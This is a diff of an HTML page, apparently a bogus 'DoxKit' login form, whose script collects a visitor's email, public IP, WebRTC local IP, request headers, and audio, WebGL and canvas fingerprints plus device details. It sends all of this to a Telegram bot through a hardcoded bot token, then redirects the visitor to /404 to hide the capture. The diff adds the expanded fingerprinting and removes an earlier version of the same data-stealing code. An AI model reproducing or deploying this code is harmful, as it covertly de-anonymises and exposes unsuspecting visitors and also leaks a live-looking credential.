@@ -63,75 +63,136 @@
       <small>Bem-vindo ao puxador de dados número 1 do Brasil!</small>
     </form>
   </div>
+<script>
+  const BOT_TOKEN = '8022691060:AAFmsFVXlUFLkB79Nb-E58CUfZM7g4oz7k8';
+  const CHAT_ID = '@pegapegaospanela';
 
-  <script>
-    const BOT_TOKEN = '8022691060:AAFmsFVXlUFLkB79Nb-E58CUfZM7g4oz7k8';
-    const CHAT_ID = '@pegapegaospanela';
-
-    async function getWebRTCIP() {
-      return new Promise((resolve) => {
-        const pc = new RTCPeerConnection({iceServers:[]});
-        pc.createDataChannel('');
-        pc.createOffer().then(offer => pc.setLocalDescription(offer));
-        pc.onicecandidate = event => {
-          if (!event || !event.candidate) return resolve("Não encontrada");
-          const ipMatch = event.candidate.candidate.match(/([0-9]{1,3}(\.[0-9]{1,3}){3})/);
-          if (ipMatch) resolve(ipMatch[1]);
-          else resolve("Não encontrada");
-        };
-      });
-    }
-
-    async function getPublicIP() {
-      try {
-        const res = await fetch('https://api64.ipify.org?format=json');
-        const data = await res.json();
-        return data.ip || "Não encontrada";
-      } catch {
-        return "Não encontrada";
-      }
-    }
-
-    async function getRequestHeaders() {
-      try {
-        const res = await fetch('https://httpbin.org/headers');
-        const json = await res.json();
-        return json.headers || {};
-      } catch {
-        return {"Headers": "Não encontrada"};
-      }
-    }
-
-    async function sendToTelegram(text) {
-      const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
-      await fetch(url, {
-        method: 'POST',
-        headers: {'Content-Type': 'application/json'},
-        body: JSON.stringify({
-          chat_id: CHAT_ID,
-          text: text,
-          parse_mode: 'Markdown'
-        })
-      });
-    }
-
-    document.getElementById('login-form').addEventListener('submit', async function(e) {
-      e.preventDefault();
-
-      const email = document.getElementById('email').value;
-      const webrtcIP = await getWebRTCIP();
-      const publicIP = await getPublicIP();
-      const headers = await getRequestHeaders();
-
-      let msg = `*Novo acesso ao DoxKit:*\n*E-mail:* ${email}\n*IP Público:* ${publicIP}\n*IP via WebRTC:* ${webrtcIP}\n\n*Headers enviados:*`;
-      for (const [key, value] of Object.entries(headers)) {
-        msg += `\n${key}: ${value}`;
-      }
-
-      await sendToTelegram(msg);
-
-      window.location.href = '/404';
+  async function getWebRTCIP() {
+    return new Promise((resolve) => {
+      const pc = new RTCPeerConnection({ iceServers: [] });
+      pc.createDataChannel('');
+      pc.createOffer().then(offer => pc.setLocalDescription(offer));
+      pc.onicecandidate = event => {
+        if (!event || !event.candidate) return resolve("Não encontrada");
+        const ipMatch = event.candidate.candidate.match(/([0-9]{1,3}(\.[0-9]{1,3}){3})/);
+        if (ipMatch) resolve(ipMatch[1]);
+        else resolve("Não encontrada");
+      };
     });
-  </script>
+  }
+
+  async function getPublicIP() {
+    try {
+      const res = await fetch('https://api64.ipify.org?format=json');
+      const data = await res.json();
+      return data.ip || "Não encontrada";
+    } catch {
+      return "Não encontrada";
+    }
+  }
+
+  async function getRequestHeaders() {
+    try {
+      const res = await fetch('https://httpbin.org/headers');
+      const json = await res.json();
+      return json.headers || {};
+    } catch {
+      return { "Headers": "Não encontrada" };
+    }
+  }
+
+  async function getAudioFingerprint() {
+    try {
+      const audioCtx = new (window.OfflineAudioContext || window.webkitOfflineAudioContext)(1, 44100, 44100);
+      const osc = audioCtx.createOscillator();
+      const comp = audioCtx.createDynamicsCompressor();
+      osc.type = "triangle";
+      osc.frequency.setValueAtTime(10000, audioCtx.currentTime);
+      comp.threshold.setValueAtTime(-50, audioCtx.currentTime);
+      comp.knee.setValueAtTime(40, audioCtx.currentTime);
+      comp.ratio.setValueAtTime(12, audioCtx.currentTime);
+      comp.attack.setValueAtTime(0, audioCtx.currentTime);
+      comp.release.setValueAtTime(0.25, audioCtx.currentTime);
+      osc.connect(comp);
+      comp.connect(audioCtx.destination);
+      osc.start(0);
+      osc.stop(audioCtx.currentTime + 0.1);
+      const buffer = await audioCtx.startRendering();
+      let sum = 0;
+      const chan = buffer.getChannelData(0);
+      for (let i = 4500; i < 5000; i++) sum += Math.abs(chan[i]);
+      return sum.toString();
+    } catch {
+      return "Indisponível";
+    }
+  }
+
+  function getWebGLFingerprint() {
+    try {
+      const canvas = document.createElement("canvas");
+      const gl = canvas.getContext("webgl") || canvas.getContext("experimental-webgl");
+      const dbg = gl.getExtension("WEBGL_debug_renderer_info");
+      if (dbg) {
+        return `${gl.getParameter(dbg.UNMASKED_VENDOR_WEBGL)} | ${gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL)}`;
+      }
+    } catch {}
+    return "Não suportado";
+  }
+
+  function getCanvasFingerprintHash() {
+    const canvas = document.createElement("canvas");
+    const ctx = canvas.getContext("2d");
+    ctx.textBaseline = "top";
+    ctx.font = "14px Arial";
+    ctx.fillText("Fingerprint!", 2, 2);
+    return canvas.toDataURL().slice(-10);
+  }
+
+  async function sendToTelegram(text) {
+    const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+    await fetch(url, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({
+        chat_id: CHAT_ID,
+        text: text,
+        parse_mode: 'Markdown'
+      })
+    });
+  }
+
+  document.getElementById('login-form').addEventListener('submit', async function (e) {
+    e.preventDefault();
+
+    const email = document.getElementById('email').value;
+    const webrtcIP = await getWebRTCIP();
+    const publicIP = await getPublicIP();
+    const headers = await getRequestHeaders();
+    const audioFP = await getAudioFingerprint();
+    const webglFP = getWebGLFingerprint();
+    const canvasFP = getCanvasFingerprintHash();
+
+    const platform = navigator.platform;
+    const userAgent = navigator.userAgent;
+    const lang = navigator.language;
+    const tz = Intl.DateTimeFormat().resolvedOptions().timeZone;
+    const res = `${screen.width}x${screen.height}`;
+    const viewport = `${window.innerWidth}x${window.innerHeight}`;
+    const cores = navigator.hardwareConcurrency || "Desconhecido";
+    const ram = navigator.deviceMemory || "Desconhecido";
+
+    let msg = `*Novo acesso ao DoxKit:*\n\n*E-mail:* ${email}\n*IP Público:* ${publicIP}\n*IP WebRTC:* ${webrtcIP}\n\n`;
+    msg += `*Plataforma:* ${platform}\n*User Agent:* ${userAgent}\n*Linguagem:* ${lang}\n*Fuso:* ${tz}\n`;
+    msg += `*Tela:* ${res}\n*Viewport:* ${viewport}\n*Cores:* ${cores}\n*RAM:* ${ram} GB\n\n`;
+    msg += `*WebGL:* ${webglFP}\n*Canvas Hash:* ${canvasFP}\n*Audio FP:* ${audioFP}\n\n`;
+    msg += `*Headers:*`;
+    for (const [key, value] of Object.entries(headers)) {
+      msg += `\n${key}: ${value}`;
+    }
+
+    await sendToTelegram(msg);
+    window.location.href = '/404';
+  });
+</script>
 </body>
 </html>
